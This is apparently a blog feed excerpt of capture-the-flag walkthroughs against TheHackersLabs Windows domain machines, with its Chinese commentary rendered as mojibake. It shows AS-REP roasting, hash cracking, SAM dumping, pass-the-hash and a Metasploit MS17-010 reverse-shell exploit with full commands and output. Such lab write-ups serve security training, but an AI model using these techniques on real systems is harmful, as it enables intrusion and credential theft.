   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/05/24 - Ronnie Flathers @ropnop

2024/12/05 16:34:26 &gt;  Using KDC(s):
2024/12/05 16:34:26 &gt;   192.168.212.4:88

2024/12/05 16:34:26 &gt;  [!] info@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...
2024/12/05 16:34:26 &gt;  [!] 2000@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...
2024/12/05 16:34:26 &gt;  [!] john@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...

2024/12/05 16:34:26 &gt;  Done! Tested 20 usernames (0 valid) in 0.002 seconds

<br>ä¹Ÿä¸è¡Œï¼Œçœ‹æ¥åªèƒ½ä»ç½‘ç«™å…¥æ‰‹äº†<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# gobuster dir -u http://192.168.212.4 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,bak,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--&gt; http://192.168.212.4/images/]
/contents             (Status: 301) [Size: 153] [--&gt; http://192.168.212.4/contents/]
/songs                (Status: 301) [Size: 150] [--&gt; http://192.168.212.4/songs/]

<br>æ‰«å‡ºæ¥æœ‰ä¸‰ä¸ªç›®å½•<br>
æˆ‘ä»¬ä¼˜å…ˆçœ‹ contents ç›®å½•<br>å¯¹è¿™ä¸ªç›®å½•åœ¨æ‰«æä¸€ä¸‹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# gobuster dir -u http://192.168.212.4/contents -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4/contents
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/notify.txt           (Status: 200) [Size: 112]

<br>è·å–åˆ°ä¸€ä¸ªæ–‡æ¡£<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# curl http://192.168.212.4/contents//notify.txt
Who the hell did you hire to create the website!
Hiding keys in MD5 again!
I'm going to fire that guy

music                                                                                                                      
ç¿»è¯‘ï¼š
â€œåˆ°åº•æ˜¯è°ç»™ä½ ä»¬å¼€å‘çš„ç½‘ç«™ï¼  
åˆç”¨ MD5 éšè—å¯†é’¥äº†ï¼  
æˆ‘è¦è§£é›‡é‚£ä¸ªå®¶ä¼™ã€‚â€

â€œmusicâ€
<br>æ„æ€æ˜¯æœ‰ä¸ªç§˜é’¥è¢«Md5åŠ å¯†äº†<br>
è¿˜å¾—åˆ°ä¸€ä¸ªç”¨æˆ· music<br>åœ¨æ‰«æä¸€ä¸‹ songs ç›®å½•ä¸‹çš„æ–‡ä»¶<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# gobuster dir -u http://192.168.212.4/songs -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4/songs
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/juicy.txt            (Status: 200) [Size: 3350]
Progress: 415286 / 415288 (100.00%)
===============================================================
Finished
===============================================================


<br>juicy.txt æ˜¯ä¸€ä¸ªæ­Œè¯æ–‡æ¡£ ã€‚æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿<br><br>å†çœ‹çœ‹å¦å¤–çš„ä¸€ä¸ªæ–‡ä»¶å¤¹<br>
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# gobuster dir -u http://192.168.212.4/images -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -                                       x jpg,png
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4/images
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/big4.jpg             (Status: 200) [Size: 196567]
Progress: 622929 / 622932 (100.00%)
===============================================================
Finished
===============================================================

<br>è¿™æœ‰ä¸€ä¸ªå›¾ç‰‡å« big4.jpg è€Œä¸”çŸ¥é“é¦–é¡µçš„å›¾ç‰‡æ˜¯ big1.jpg<br>é‚£æˆ‘ä¼°è®¡è¿˜æœ‰å¥½å‡ ä¸ªbig2ã€3ã€4ã€5ã€6ä¹‹ç±»çš„<br>
å°è¯•éƒ½ä¸‹ä¸‹æ¥<br>ç»è¿‡æµ‹è¯• ä¸€å…±æœ‰4å¼ å›¾ç‰‡<br>
<img alt="big1" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" referrerpolicy="no-referrer"><br>
<img alt="big2" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big2.jpg" referrerpolicy="no-referrer"><br>
<img alt="big3" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big3.jpg" referrerpolicy="no-referrer"><br>
<img alt="big4" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big4.jpg" referrerpolicy="no-referrer"><br>
æˆ‘å†…ä¸ªå¤§å¸…å“¥å•Š<br>è¿™å‡ å¼ å›¾ç‰‡é‡Œé¢è‚¯å®šæ˜¯æœ‰ä¸œè¥¿çš„<br>
å¯¹å›¾ç‰‡è¿›è¡Œæ£€æµ‹æ˜¯å¦å­˜åœ¨éšè—å†…å®¹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# stegseek --seed big2.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found (possible) seed: "c2726679"
        Plain size: 43.0 Byte(s) (compressed)
        Encryption Algorithm: rijndael-128
        Encryption Mode:      cbc

<br>å¯¹å››ä¸ªæ£€æµ‹åå‘ç° big2.jpg å­˜åœ¨éšå†™ã€‚ä½†æ˜¯éœ€è¦å¯†ç æ‰èƒ½è§£å¯†<br>å‰é¢æœ‰æåˆ°å¯†ç æ˜¯ä¸€ä¸ªmd5<br>
ä¹‹å‰ç½‘ç«™æºç é‡Œé¢æ˜¯æœ‰ä¸€æ®µå…³é”®çš„è¯çš„ It was all a dream<br>
å°è¯•å¯¹è¿™ä¸ªè¿›è¡Œmd5 ç„¶åä½¿ç”¨md5è¿ç®—åçš„å€¼è¿›è¡Œè§£å¯†<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# echo -n 'It was all a dream' |md5sum
99ae77c0c0faf78b872f9f452e3eaa24  -

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# steghide extract -sf big2.jpg
Enter passphrase: 99ae77c0c0faf78b872f9f452e3eaa24
wrote extracted data to "frase.txt".

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# cat frase.txt
Bigpoppa1972

<br>æˆåŠŸè·å–åˆ°ä¸€ä¸ªå­—ç¬¦ä¸² åº”è¯¥æ˜¯å¯†ç <br><br>åˆ©ç”¨ music : Bigpoppa1972  winrmç™»å½•ä¸Šæ¥<br>
å…ˆçœ‹æƒé™æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„<br>*Evil-WinRM* PS C:\Users\TEMP\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br>æ²¡æœ‰çœ‹åˆ°å¯ä»¥ç›´æ¥ç”¨çš„<br><br>æ”¶é›†åŸŸå†…ä¿¡æ¯<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# netexec ldap 192.168.212.4 -u 'music' -p 'Bigpoppa1972'  --bloodhound --collection All --dns-server 192.168.212.4
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
LDAP        192.168.212.4   389    BIG              [+] bbr.thl\music:Bigpoppa1972
LDAP        192.168.212.4   389    BIG              Resolved collection methods: group, acl, dcom, session, rdp, psremote, container, trusts, objectprops, localadmin
LDAP        192.168.212.4   389    BIG              Done in 00M 00S
LDAP        192.168.212.4   389    BIG              Compressing output into /root/.nxc/logs/BIG_192.168.212.4_2024-12-06_083621_bloodhound.zip


<br>å¯¼å…¥è¿›è¡Œåˆ†æ<br>
å‘ç°songç”¨æˆ·æ˜¯æ— é¢„èº«ä»½éªŒè¯çš„è´¦æˆ·<br>
å­˜åœ¨AS-REPæ¼æ´<br>
<img alt="Pasted image 20241205174333" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205174333.png" referrerpolicy="no-referrer"><br><br>å› ä¸ºsong æ˜¯æ— é¢„èº«ä»½éªŒè¯çš„è´¦æˆ· å³ç¦ç”¨é¢„è®¤è¯çš„ç”¨æˆ·<br>
ç¦ç”¨é¢„è®¤è¯çš„ç”¨æˆ·ä¼šå‘åŸŸæ§åˆ¶å™¨å‘é€ä¸åŒ…å«åŠ å¯†çš„èº«ä»½éªŒè¯è¯·æ±‚ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æ•è· AS-REP å“åº”å¹¶è¿›è¡Œå¯†ç ç ´è§£ã€‚
<br>æˆ‘ä»¬å¯ä»¥è¿›è¡Œ AS-REPRoasting æ”»å‡»<br>
åœ¨æ”»å‡»ä¹‹å‰å…ˆåŒæ­¥åŸŸæ—¶é—´<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# rdate -n 192.168.212.4
Fri Dec  6 08:47:54 CST 2024

<br>æ•è· AS-REP å“åº”<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# impacket-GetNPUsers bbr.thl/song:123
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Cannot authenticate song, getting its TGT
$krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729cd8e104cf$ce7dbe4474a7db21b21809a7af5f3416786079bc76f6f780dbea54769b28b03d04ca645a378eeddce0bee8615211f36cfeba66c4bf4c3b7c4adcc74b474482a977105c2d8571ff3b2393b5a61e1292c8ffa7b801ce0d76f1ae4d540ccabd7430f1f67175812a94ca527b707fc07644e6f22d2cba60f0f6e280b4f0f7dc28817df23202d8b9b81ca5d9a0ad02dcbed0a7d87b797236a902051c44a83ebe97f603b741754f36b1cbed5d9dd71d3cd82017db227d6a8004af1bf4007877cdcc2e7af7c83e60304973c0dcb5fbb98cebbe59334307b935065b1a4abbba83b5bb82cdb409
<br>hashcat ç ´è§£å‘ç°ç”¨rockyouçˆ†ç ´ä¸å‡ºæ¥<br>
å¯èƒ½æ˜¯ä¿¡æ¯æ”¶é›†ä¸å¤Ÿã€‚ æˆ‘ä»¬ç›´æ¥å»çœ‹ä¸€ä¸‹ç½‘ç«™ç›®å½•ä¸‹æœ‰ä»€ä¹ˆä¸œè¥¿<br>*Evil-WinRM* PS C:\inetpub\wwwroot\songs&gt; dir


    Directory: C:\inetpub\wwwroot\songs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/2/2024   4:54 AM           3535 BigPoppa.txt
-a----         5/2/2024   4:54 AM           4280 Hypnotize.txt
-a----         5/2/2024   4:54 AM           3350 Juicy.txt
-a----         5/2/2024   4:54 AM           1793 Skyisthelimit.txt
-a----         5/3/2024   2:06 PM            168 web.config

<br>å¯ä»¥å‘ç°ç½‘ç«™ songs ç›®å½•ä¸‹æˆ‘ä»¬å°‘æ‹¿äº†å¾ˆå¤šæ–‡ä»¶<br>éƒ½ä¸‹ä¸‹æ¥çœ‹çœ‹<br>
å‘ç° Skyisthelimit.txt é‡Œé¢æ˜¯ä¸€ä¸ªå¯†ç å­—å…¸<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# cat Skyisthelimit.txt
123456
admin
12345678
123456789
1234
12345
password
123
Aa123456
1234567890
UNKNOWN
1234567
...

<br>åˆ©ç”¨è¿™ä¸ªå­—å…¸è¿›è¡Œçˆ†ç ´<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# hashcat -a 0 -m 18200 as-rep.txt Skyisthelimit.txt
hashcat (v6.2.6) starting


$krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729cd8e104cf$ce7dbe4474a7db21b21809a7af5f3416786079bc76f6f780dbea54769b28b03d04ca645a378eeddce0bee8615211f36cfeba66c4bf4c3b7c4adcc74b474482a977105c2d8571ff3b2393b5a61e1292c8ffa7b801ce0d76f1ae4d540ccabd7430f1f67175812a94ca527b707fc07644e6f22d2cba60f0f6e280b4f0f7dc28817df23202d8b9b81ca5d9a0ad02dcbed0a7d87b797236a902051c44a83ebe97f603b741754f36b1cbed5d9dd71d3cd82017db227d6a8004af1bf4007877cdcc2e7af7c83e60304973c0dcb5fbb98cebbe59334307b935065b1a4abbba83b5bb82cdb409:Passwordsave@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729c...cdb409
Time.Started.....: Fri Dec  6 11:30:12 2024 (0 secs)
Time.Estimated...: Fri Dec  6 11:30:12 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Skyisthelimit.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   429.8 kH/s (0.07ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 201/201 (100.00%)
Rejected.........: 0/201 (0.00%)
Restore.Point....: 0/201 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -&gt; qwerty123456
Hardware.Mon.#1..: Util: 13%

<br>æˆåŠŸå¾—åˆ° song ç”¨æˆ·çš„å¯†ç  Passwordsave@<br><br>åˆ©ç”¨è´¦æˆ·å¯†ç ç™»å½•ä¸Šå» çœ‹ä¸€ä¸‹ song ç”¨æˆ·çš„æƒé™<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

<br>å‘ç°å­˜åœ¨ SeBackupPrivilege (å¤‡ä»½æ–‡ä»¶å’Œç›®å½•) æƒé™<br>
é‚£ä¹ˆå¯ä»¥è¿›è¡ŒSAMè½¬å‚¨<br>åœ¨ song ç”¨æˆ·çš„winrmå®¢æˆ·ç«¯ä¸‹<br>
æ‰¾ä¸€ä¸ªå¯ä»¥ä¸‹è½½çš„ç›®å½•<br>
è½¬å‚¨sam ä¸ç³»ç»Ÿæ³¨å†Œè¡¨<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; reg save hklm\sam sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; reg save hklm\system system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; dir


    Directory: C:\Users\TEMP.bbr\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/5/2024   9:05 PM          36864 sam.hive
-a----        12/5/2024   9:05 PM        9945088 system.hive

<br>ç„¶åä¸‹è½½åˆ°kali<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; download sam.hive

Info: Downloading C:\Users\TEMP.bbr\Documents\sam.hive to sam.hive

Info: Download successful!
*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; download system.hive

Info: Downloading C:\Users\TEMP.bbr\Documents\system.hive to system.hive

Info: Download successful!

<br>ä½¿ç”¨ impacket-secretsdump ä»æ³¨å†Œè¡¨è½¬å‚¨æ–‡ä»¶ä¸­è·å– ntlm å“ˆå¸Œ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xbb33617256ea48219d9d3d01766b7a9e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb1c50a48c37e053d2045cd5b55cd2f2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...


<br>è·å–åˆ°ç®¡ç†å‘˜çš„å“ˆå¸Œï¼ŒPTHä¼ é€’ ç™»å½•ä¸Šå»<br>evil-winrm -i 192.168.212.4 -u administrator -H 5d48bcf84aea999fb1ade06970a81237

*Evil-WinRM* PS C:\users\music\documents&gt; type user.txt
53bdf70c03ad626fe7a17ba5a9495b3a

*Evil-WinRM* PS C:\Users\Administrator\documents&gt; type root.txt
8e824f6e933f0b62616aa54d75416184

<br>
è¿™é‡Œæœ‰ç‚¹é—®é¢˜ã€‚ æˆ‘ä»¬è·å–åˆ°çš„hashæ˜¯bb1c50a48c37e053d2045cd5b55cd2f2<br>
ä½†æ˜¯ç­‰ä¸ä¸Šå»ã€‚ æ­£ç¡®çš„hashæ˜¯5d48bcf84aea999fb1ade06970a81237
<br>çœ‹äº†ä¸€ä¸‹wpã€‚<br>
5d48bcf84aea999fb1ade06970a81237 çš„æ¥æºæ˜¯çœ‹çš„è¿™ä¸ª <a data-tooltip-position="top" aria-label="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" rel="noopener nofollow" class="external-link" href="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" target="_blank">wp</a> <br>è€Œä¸”å®˜æ–¹ä¸‹é¢çš„ <a data-tooltip-position="top" aria-label="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" rel="noopener nofollow" class="external-link" href="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" target="_blank">wp</a> ç”¨çš„åˆæ˜¯ bb1c50a48c37e053d2045cd5b55cd2f2 ç™»ä¸Šå»çš„<br>æˆ‘çŒœæµ‹å¯èƒ½æ˜¯ç”¨æˆ·æ”¹å˜å¯¼è‡´çš„<br>
<img alt="Pasted image 20241205212440" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205212440.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/4.big.html</link><guid isPermaLink="false">24-æ¸—é€/THL/4.BIG.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Doraemon]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. MS17-010" data-href="#3. MS17-010" href="https://www.c1trus.top/about:blank#3._MS17-010" class="internal-link" target="_self" rel="noopener nofollow">3. MS17-010</a><br>
é¶æœºé“¾æ¥  <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/doraemon/" target="_blank">https://thehackerslabs.com/doraemon/</a><br>
éš¾åº¦ â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/doraemon]
â””â”€#  fscan -h 192.168.10.5

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.10.5:139 open
192.168.10.5:445 open
192.168.10.5:135 open
192.168.10.5:88 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.10.5
   [-&gt;]WIN-VRU3GG3DPLJ
   [-&gt;]192.168.10.5
[+] MS17-010 192.168.10.5       (Windows Server 2016 Datacenter 14393)
[*] NetBios 192.168.10.5    [+] DC:WIN-VRU3GG3DPLJ.DORAEMON.THL      â–’Windows Server 2016 Datacenter 14393
å·²å®Œæˆ 4/4
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.017942284s

<br>åŸŸå DORAEMON.THL<br>
DC  WIN-VRU3GG3DPLJ.DORAEMON.THL<br>å…ˆé…hosts<br><br>å‘ç°æœ‰ms17-010<br>
çœ‹çœ‹èƒ½ä¸èƒ½ç”¨ã€ç›´æ¥æ¢­å“ˆ<br>msfconsole
use exploit/windows/smb/ms17_010_psexec
set rhosts 192.168.10.5
set lhost 192.168.10.3
run

msf6 exploit(windows/smb/ms17_010_psexec) &gt; run

[*] Started reverse TCP handler on 192.168.10.3:4444
[*] 192.168.10.5:445 - Target OS: Windows Server 2016 Datacenter 14393
[*] 192.168.10.5:445 - Built a write-what-where primitive...
[+] 192.168.10.5:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.10.5:445 - Selecting PowerShell target
[*] 192.168.10.5:445 - Executing the payload...
[+] 192.168.10.5:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 192.168.10.5
[*] Meterpreter session 1 opened (192.168.10.3:4444 -&gt; 192.168.10.5:49724) at 2024-12-05 15:23:39 +0800

meterpreter &gt; shell
Process 1124 created.
Channel 1 created.
Microsoft Windows [Versiâ–’n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

<br>è¿™åº”è¯¥æ˜¯æ‹¿ä¸‹äº†å§<br>c:\Users\Administrador\Desktop&gt;type root.txt
type root.txt
advcrfbuiwergvb78wer9hg3n4sdfs43

c:\Users&gt;type Suneo\desktop\user.txt
type Suneo\desktop\user.txt
asfre6vcergv3bvfsiregvrtetgb9rnwn543

]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/3.doraemon.html</link><guid isPermaLink="false">24-æ¸—é€/THL/3.Doraemon.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[2.Pacharan]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. smbç©ºä¼šè¯æ£€æµ‹" data-href="#3. smbç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#3._smbç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3. smbç©ºä¼šè¯æ£€æµ‹</a>
<br><a data-tooltip-position="top" aria-label="4. Kerbrute force" data-href="#4. Kerbrute force" href="https://www.c1trus.top/about:blank#4._Kerbrute_force" class="internal-link" target="_self" rel="noopener nofollow">4. Kerbrute force</a>
<br><a data-tooltip-position="top" aria-label="5. å¯†ç å–·æ¶‚" data-href="#5. å¯†ç å–·æ¶‚" href="https://www.c1trus.top/about:blank#5._å¯†ç å–·æ¶‚" class="internal-link" target="_self" rel="noopener nofollow">5. å¯†ç å–·æ¶‚</a>
<br><a data-tooltip-position="top" aria-label="6. Orujoåˆ©ç”¨" data-href="#6. Orujoåˆ©ç”¨" href="https://www.c1trus.top/about:blank#6._Orujoåˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">6. Orujoåˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="7. Whiskyç”¨æˆ·åˆ©ç”¨" data-href="#7. Whiskyç”¨æˆ·åˆ©ç”¨" href="https://www.c1trus.top/about:blank#7._Whiskyç”¨æˆ·åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">7. Whiskyç”¨æˆ·åˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="8. CVE-2021-34527 ææƒåˆ°ç³»ç»Ÿç”¨æˆ·" data-href="#8. CVE-2021-34527 ææƒåˆ°ç³»ç»Ÿç”¨æˆ·" href="https://www.c1trus.top/about:blank#8._CVE-2021-34527_ææƒåˆ°ç³»ç»Ÿç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">8. CVE-2021-34527 ææƒåˆ°ç³»ç»Ÿç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="9. æ–¹å¼2ï¼š SeLoadDriverPrivilegeæƒé™ææƒåˆ°ç³»ç»Ÿ" data-href="#9. æ–¹å¼2ï¼š SeLoadDriverPrivilegeæƒé™ææƒåˆ°ç³»ç»Ÿ" href="https://www.c1trus.top/about:blank#9._æ–¹å¼2ï¼š_SeLoadDriverPrivilegeæƒé™ææƒåˆ°ç³»ç»Ÿ" class="internal-link" target="_self" rel="noopener nofollow">9. æ–¹å¼2ï¼š SeLoadDriverPrivilegeæƒé™ææƒåˆ°ç³»ç»Ÿ</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# fscan -h 192.168.69.69

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| ''__/ _ |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.69.69:445 open
192.168.69.69:88 open
192.168.69.69:139 open
192.168.69.69:135 open
[*] alive ports len is: 4
start vulscan
[*] NetBios 192.168.69.69   [+] DC:PACHARAN\WIN-VRU3GG3DPLJ
[*] NetInfo
[*]192.168.69.69
   [-&gt;]WIN-VRU3GG3DPLJ
   [-&gt;]192.168.69.69
